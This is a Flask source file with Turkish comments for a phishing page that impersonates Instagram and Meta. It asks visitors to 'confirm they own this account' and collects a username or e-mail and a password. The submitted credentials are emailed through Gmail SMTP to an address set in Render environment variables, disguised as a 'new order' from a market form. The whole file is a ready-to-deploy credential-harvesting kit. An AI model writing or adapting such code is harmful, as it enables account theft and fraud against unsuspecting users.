from flask import Flask, request, render_template_string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

app = Flask(__name__)

# ==================================================
# BURAYI DEĞİŞTİR
# ==================================================

# Market üstte büyük yazacak isim
MARKET_ADI = "INSTAGRAM"

# Market isminin altında çıkacak açıklama yazısı
# Buraya marketle ilgili istediğin yazıyı yaz
MARKET_ACIKLAMA = "Bu Hesabın Sahibi Olduğuna Onaylamamıza Yardımcı Ol"

# Sayfanın en altında küçük logo gibi çıkacak yazı
ALT_LOGO_YAZISI = "META"

# ==================================================
# GMAIL BİLGİLERİ
# Render Environment Variables kısmından gelecek
# BUNLARA DOKUNMA
# ==================================================

GMAIL_GONDEREN = os.environ.get("GMAIL_USER")
GMAIL_APP_SIFRE = os.environ.get("GMAIL_PASS")
ALICI_MAIL = os.environ.get("RECEIVER_EMAIL")

# ==================================================
# HTML SAYFASI
# ==================================================

HTML = """
<!doctype html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ market_adi }}</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            background: linear-gradient(160deg, #120707 0%, #2a0b0b 35%, #5c1010 70%, #1a0909 100%);
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .sayfa {
            width: 100%;
            max-width: 460px;
            padding: 30px 22px 18px 22px;
            text-align: center;
            color: white;
        }

        .market-baslik {
            font-size: 34px;
            font-weight: bold;
            letter-spacing: 1px;
            margin-bottom: 10px;
            color: #ffffff;
            text-shadow: 0 0 8px rgba(255, 0, 0, 0.25);
        }

        .market-aciklama {
            font-size: 15px;
            line-height: 1.6;
            color: #f2dede;
            margin-bottom: 28px;
            padding-left: 6px;
            padding-right: 6px;
        }

        form {
            width: 100%;
        }

        .giris-alani {
            width: 100%;
            padding: 15px 16px;
            margin-bottom: 16px;
            border: none;
            border-radius: 14px;
            outline: none;
            font-size: 16px;
            background: rgba(255, 255, 255, 0.10);
            color: white;
            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.25);
        }

        .giris-alani::placeholder {
            color: #f3c9c9;
        }

        .gonder-buton {
            width: 100%;
            padding: 15px;
            margin-top: 6px;
            border: none;
            border-radius: 14px;
            background: linear-gradient(90deg, #7a0d0d, #c42020);
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.28);
            transition: 0.2s;
        }

        .gonder-buton:hover {
            transform: scale(1.02);
            opacity: 0.96;
        }

        .mesaj {
            margin-top: 18px;
            padding: 13px;
            border-radius: 12px;
            text-align: center;
            font-weight: bold;
            font-size: 14px;
        }

        .basarili {
            background: rgba(50, 180, 90, 0.16);
            color: #c7ffd3;
            border: 1px solid rgba(50, 180, 90, 0.35);
        }

        .hatali {
            background: rgba(255, 80, 80, 0.16);
            color: #ffd0d0;
            border: 1px solid rgba(255, 80, 80, 0.35);
        }

        .alt-logo {
            margin-top: 40px;
            text-align: center;
            font-size: 13px;
            font-weight: bold;
            letter-spacing: 4px;
            color: #ffb3b3;
            opacity: 0.78;
        }
    </style>
</head>
<body>
    <div class="sayfa">

        <!-- ÜST ORTADA MARKET İSMİ -->
        <div class="market-baslik">
            {{ market_adi }}
        </div>

        <!-- MARKET İSMİNİN ALTINDA KUTUSUZ AÇIKLAMA -->
        <div class="market-aciklama">
            {{ market_aciklama }}
        </div>

        <!-- İKİ GİRİŞ ALANI -->
        <form method="POST">

            <!-- 1. ALAN -->
            <!-- Placeholder yazısını buradan değiştir -->
            <input
                type="text"
                class="giris-alani"
                name="urun1"
                placeholder="eposta veya kullanıcı adı"
            >

            <!-- 2. ALAN -->
            <!-- Placeholder yazısını buradan değiştir -->
            <input
                type="text"
                class="giris-alani"
                name="urun2"
                placeholder="şifre"
            >

            <!-- GÖNDER BUTONU -->
            <!-- Buton yazısını buradan değiştir -->
            <button type="submit" class="gonder-buton">Gönder</button>
        </form>

        {% if mesaj %}
            <div class="mesaj {{ mesaj_tipi }}">
                {{ mesaj }}
            </div>
        {% endif %}

        <!-- EN ALTTA KÜÇÜK LOGO GİBİ YAZI -->
        <div class="alt-logo">
            {{ alt_logo_yazisi }}
        </div>
    </div>
</body>
</html>
"""

# ==================================================
# MAIL GÖNDERME
# ==================================================

def mail_gonder(urun1, urun2):
    if not GMAIL_GONDEREN or not GMAIL_APP_SIFRE or not ALICI_MAIL:
        raise Exception("Render environment variables eksik")

    konu = f"{MARKET_ADI} - Yeni Sipariş"

    icerik = f"""
Yeni sipariş geldi.

Market adı: {MARKET_ADI}
1. Alan: {urun1 if urun1 else '-'}
2. Alan: {urun2 if urun2 else '-'}
"""

    msg = MIMEMultipart()
    msg["From"] = GMAIL_GONDEREN
    msg["To"] = ALICI_MAIL
    msg["Subject"] = konu
    msg.attach(MIMEText(icerik, "plain", "utf-8"))

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(GMAIL_GONDEREN, GMAIL_APP_SIFRE)
        server.send_message(msg)

# ==================================================
# ANA SAYFA
# ==================================================

@app.route("/", methods=["GET", "POST"])
def index():
    mesaj = ""
    mesaj_tipi = ""

    if request.method == "POST":
        urun1 = request.form.get("urun1", "").strip()
        urun2 = request.form.get("urun2", "").strip()

        if not urun1 and not urun2:
            mesaj = "En az bir alan doldurmalısın."
            mesaj_tipi = "hatali"
        else:
            try:
                mail_gonder(urun1, urun2)
                mesaj = "Bilgiler başarıyla gönderildi."
                mesaj_tipi = "basarili"
            except Exception as e:
                mesaj = f"Hata oluştu: {str(e)}"
                mesaj_tipi = "hatali"

    return render_template_string(
        HTML,
        market_adi=MARKET_ADI,
        market_aciklama=MARKET_ACIKLAMA,
        alt_logo_yazisi=ALT_LOGO_YAZISI,
        mesaj=mesaj,
        mesaj_tipi=mesaj_tipi
    )

# ==================================================
# ÇALIŞTIRMA
# ==================================================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
